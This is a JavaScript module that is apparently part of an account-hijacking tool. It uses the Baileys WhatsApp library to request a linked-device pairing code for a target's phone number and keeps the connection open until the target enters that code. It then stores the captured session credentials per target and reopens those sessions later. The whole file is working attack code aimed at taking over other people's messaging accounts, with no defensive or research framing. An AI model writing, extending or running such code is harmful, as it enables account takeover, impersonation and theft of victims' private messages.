// language: JavaScript, file: lib/hijackSession.js
'use strict';

const fs     = require('fs');
const path   = require('path');

const ROOT = path.join(process.cwd(), 'hijack_sessions');

// pairing sockets that must stay alive until target enters code.
// keyed as `${scope}:${phone}` so two operators pairing same phone don't collide.
const _pendingPairing = new Map();

function ensureDir(p) {
    if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true });
}

function scopeDir(scope) {
    const clean = String(scope).replace(/[^\w.-]/g, '_');
    return path.join(ROOT, clean);
}

function readTargets(scope) {
    const dir = scopeDir(scope);
    if (!fs.existsSync(dir)) return [];
    try {
        return fs.readdirSync(dir, { withFileTypes: true })
            .filter(d => d.isDirectory())
            .map(d => d.name);
    } catch { return []; }
}

function addTarget(scope, phone) {
    const clean = String(phone).replace(/\D/g, '');
    if (!clean) return readTargets(scope);
    ensureDir(path.join(scopeDir(scope), clean));
    return readTargets(scope);
}

function hasCreds(scope, targetPhone) {
    const dir  = path.join(scopeDir(scope), String(targetPhone).replace(/\D/g, ''));
    const file = path.join(dir, 'creds.json');
    return fs.existsSync(file);
}

function getBaileys() {
    const c = ['@pasqua-baileys/baileys','@itsliaaa/baileys','@whiskeysockets/baileys','@adiwajshing/baileys'];
    for (const p of c) { try { return require(p); } catch {} }
    return null;
}

// ──────────────────────────────────────────────────────────────────
// pairHijackSession — boot socket, request code, keep socket alive
// resolves { code, sock }. creds land in hijack_sessions/{scope}/{phone}/
// ──────────────────────────────────────────────────────────────────
async function pairHijackSession(scope, targetPhone) {
    const cleanPhone = String(targetPhone).replace(/\D/g, '');
    if (!cleanPhone) throw new Error('targetPhone required');

    const dir = path.join(scopeDir(scope), cleanPhone);
    ensureDir(dir);

    const baileys = getBaileys();
    if (!baileys) throw new Error('baileys missing');

    const {
        default: makeWASocket,
        useMultiFileAuthState,
        fetchLatestBaileysVersion,
        Browsers,
    } = baileys;

    const { state, saveCreds } = await useMultiFileAuthState(dir);

    if (state.creds.registered) {
        throw new Error('already registered — session exists');
    }

    const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: undefined }));

    const sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers?.ubuntu?.('Chrome') || ['Ubuntu', 'Chrome', '120.0.0'],
        printQRInTerminal: false,
        syncFullHistory: false,
        markOnlineOnConnect: false,
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (u) => {
        if (u.connection === 'open') {
            _pendingPairing.delete(`${scope}:${cleanPhone}`);
            setTimeout(() => { try { sock.end(undefined); } catch {} }, 1000);
        }
        if (u.connection === 'close') {
            _pendingPairing.delete(`${scope}:${cleanPhone}`);
        }
    });

    const code = await sock.requestPairingCode(cleanPhone);
    _pendingPairing.set(`${scope}:${cleanPhone}`, sock);

    return { code, sock };
}

async function bootHijackSession(scope, targetPhone) {
    const phone = String(targetPhone).replace(/\D/g, '');
    if (!phone) throw new Error('targetPhone required');
    const dir  = path.join(scopeDir(scope), phone);
    const file = path.join(dir, 'creds.json');
    if (!fs.existsSync(file)) throw new Error(`no creds for ${phone}`);

    const baileys = getBaileys();
    if (!baileys) throw new Error('baileys missing');

    const {
        default: makeWASocket,
        useMultiFileAuthState,
        fetchLatestBaileysVersion,
        Browsers,
    } = baileys;

    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: undefined }));

    const sock = makeWASocket({
        version,
        auth: state,
        browser: Browsers?.ubuntu?.('Chrome') || ['Ubuntu', 'Chrome', '120.0.0'],
        printQRInTerminal: false,
        syncFullHistory: false,
        markOnlineOnConnect: false,
    });

    sock.ev.on('creds.update', saveCreds);

    await new Promise((resolve, reject) => {
        const timer = setTimeout(() => reject(new Error('hijack socket open timeout')), 30000);
        sock.ev.on('connection.update', (u) => {
            if (u.connection === 'open') { clearTimeout(timer); resolve(); }
            if (u.connection === 'close') { clearTimeout(timer); reject(new Error('hijack socket closed')); }
        });
    });

    return sock;
}

function closePendingPairing(scope, phone) {
    const key = `${scope}:${String(phone).replace(/\D/g, '')}`;
    const sock = _pendingPairing.get(key);
    if (sock) {
        try { sock.end(undefined); } catch {}
        _pendingPairing.delete(key);
    }
}

module.exports = {
    readTargets, addTarget, hasCreds,
    pairHijackSession, bootHijackSession,
    closePendingPairing, scopeDir,
};